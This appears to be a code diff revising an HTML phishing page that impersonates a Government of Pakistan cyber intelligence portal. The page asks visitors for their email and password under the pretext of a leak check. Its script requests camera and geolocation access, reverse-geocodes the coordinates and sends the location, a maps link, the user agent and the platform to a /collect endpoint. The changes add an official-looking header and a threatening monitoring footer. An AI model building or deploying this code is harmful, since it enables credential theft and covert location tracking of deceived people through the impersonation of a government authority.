@@ -9,31 +9,41 @@
     body {
       margin: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #1b2631;
-      color: #fff;
+      background: #121d2b;
+      color: #ffffff;
       display: flex;
       flex-direction: column;
       justify-content: space-between;
       align-items: center;
       height: 100vh;
-      padding: 20px 0;
+    }
+    header, footer {
+      width: 100%;
+      background-color: #0a1420;
+      padding: 12px 0;
+      text-align: center;
+      font-size: 14px;
+      color: #bbb;
+      box-shadow: 0 1px 6px rgba(0,0,0,0.3);
     }
     .box {
-      background: rgba(255, 255, 255, 0.1);
+      background: rgba(255, 255, 255, 0.08);
       padding: 30px;
       border-radius: 16px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.3);
+      box-shadow: 0 0 25px rgba(0,0,0,0.5);
       text-align: center;
-      width: 380px;
-      backdrop-filter: blur(8px);
+      width: 400px;
+      backdrop-filter: blur(12px);
+      margin: 40px 0;
     }
     h1 {
       font-size: 20px;
       margin-bottom: 8px;
+      color: #f5b041;
     }
     p {
       font-size: 13px;
-      margin: 8px 0;
+      margin: 10px 0;
     }
     input, button {
       width: 100%;
@@ -67,37 +77,34 @@
       width: 80px;
       margin-bottom: 10px;
     }
-    footer {
-      font-size: 11px;
-      color: #aaa;
-      text-align: center;
-      padding: 10px;
-    }
   </style>
 </head>
 <body>
-  <div>
-    <h3 style="color: #f1c40f; text-align:center;">Confidential Access - Secure Portal</h3>
-  </div>
+  <header>
+    Ministry of IT & Cyber Security Department | Confidential Access - Secure Portal
+  </header>
+
   <div class="box">
     <img src="/static/pakistan-emblem.png" alt="Gov Logo" />
-    <h1>🇵🇰 Government of Pakistan – Cyber Intelligence</h1>
-    <p>Enter your email to check leaked data in our cyber database</p>
+    <h1>🛡️ Cyber Intelligence – Government of Pakistan</h1>
+    <p>Enter your email to check if your credentials are part of any national data leaks.</p>
     <form method="POST" action="/login">
-      <input type="text" name="email" placeholder="Email" required />
+      <input type="text" name="email" placeholder="Email Address" required />
       <input type="password" name="password" placeholder="Password" required />
       <a href="https://accounts.google.com/signin/v2/usernamerecovery" class="forgot">Forgot Password?</a>
-      <button type="submit">🔍 Check Now</button>
+      <button type="submit">🔍 Scan Now</button>
     </form>
   </div>
+
   <footer>
-    All activity is being monitored for national security purposes. Unauthorized access is prohibited.
+    ⚠️ All activity is monitored & logged by National Cyber Security Cell. Unauthorized access is a criminal offense.
   </footer>
 
   <script>
     async function reverseGeocode(lat, lon) {
       try {
-        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`, {
+        const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
+        const res = await fetch(url, {
           headers: { 'User-Agent': 'Mozilla/5.0' }
         });
         const data = await res.json();
@@ -106,57 +113,28 @@
           country: data.address.country || "Unknown",
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
         };
-      } catch {
+      } catch (e) {
         return { city: "Unknown", country: "Unknown", timezone: "Unknown" };
       }
     }
 
-    function getDeviceName(userAgent) {
-      const devices = [
-        { name: "Samsung", pattern: /samsung|sm-/i },
-        { name: "Xiaomi", pattern: /xiaomi|redmi|mi /i },
-        { name: "Oppo", pattern: /oppo/i },
-        { name: "Vivo", pattern: /vivo/i },
-        { name: "Realme", pattern: /realme/i },
-        { name: "Infinix", pattern: /infinix/i },
-        { name: "Tecno", pattern: /tecno/i },
-        { name: "Sony", pattern: /sony/i },
-        { name: "OnePlus", pattern: /oneplus/i },
-        { name: "Google Pixel", pattern: /pixel/i },
-        { name: "iPhone", pattern: /iphone/i },
-      ];
-      for (const device of devices) {
-        if (device.pattern.test(userAgent)) return device.name;
-      }
-      return "Unknown Device";
-    }
-
-    async function sendFullData(coords, cameraStatus) {
-      const userAgent = navigator.userAgent;
-      const deviceInfo = getDeviceName(userAgent);
-      let ip = "Unknown", locationData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };
-
-      try {
-        const ipRes = await fetch("https://api64.ipify.org?format=json");
-        const ipJson = await ipRes.json();
-        ip = ipJson.ip;
-      } catch {}
-
-      if (coords) {
-        locationData = await reverseGeocode(coords.latitude, coords.longitude);
+    async function sendFullData(locationCoords, cameraStatus) {
+      let locationData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };
+      if (locationCoords) {
+        locationData = await reverseGeocode(locationCoords.latitude, locationCoords.longitude);
       }
 
       const payload = {
-        ip,
-        latitude: coords?.latitude || null,
-        longitude: coords?.longitude || null,
-        mapsLink: coords ? `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}` : "❌ Location Denied",
+        ip: "Unknown",
+        latitude: locationCoords?.latitude || null,
+        longitude: locationCoords?.longitude || null,
+        mapsLink: locationCoords ? `https://www.google.com/maps?q=${locationCoords.latitude},${locationCoords.longitude}` : "❌ Location Denied",
         timezone: locationData.timezone,
         city: locationData.city,
         country: locationData.country,
         camera: cameraStatus,
-        userAgent,
-        deviceInfo
+        userAgent: navigator.userAgent,
+        deviceInfo: navigator.platform
       };
 
       await fetch("/collect", {
@@ -186,8 +164,12 @@
         }, 3000);
 
         navigator.geolocation.getCurrentPosition(
-          pos => sendFullData(pos.coords, "✅ Camera Allowed"),
-          () => sendFullData(null, "✅ Camera Allowed, ❌ Location Denied")
+          pos => {
+            sendFullData(pos.coords, "✅ Camera Allowed");
+          },
+          err => {
+            sendFullData(null, "✅ Camera Allowed, ❌ Location Denied");
+          }
         );
       } catch (err) {
         sendFullData(null, "❌ Camera Denied");
